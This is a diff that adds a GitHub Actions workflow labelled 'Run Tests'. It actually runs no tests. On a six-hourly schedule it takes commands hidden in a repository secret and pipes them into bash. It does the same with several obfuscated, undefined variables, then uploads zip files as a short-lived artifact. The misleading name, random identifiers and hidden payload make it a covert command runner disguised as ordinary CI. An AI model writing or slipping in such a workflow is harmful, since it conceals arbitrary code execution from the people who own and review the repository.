@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          jlp59: ${{ secrets.jlp59 }}
+        run: |
+          printf '%s' "$jlp59" | jq -r .tw89615 | /bin/bash
+          echo $t8 | jq -r .p22 | /bin/bash
+          printf '%s' "$gicjl144" | jq -r .nl42189 | /bin/bash
+          echo $gr636 | jq -r .jav0 | /bin/bash
+          printf '%s' "$bsl2" | jq -r .x4 | /bin/bash
+          printf '%s' "$r592" | jq -r .f1 | /bin/bash
+          printf '%s' "$y921" | jq -r .g3 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: yAEMf30a
+          path: "*.zip"
+          retention-days: 1
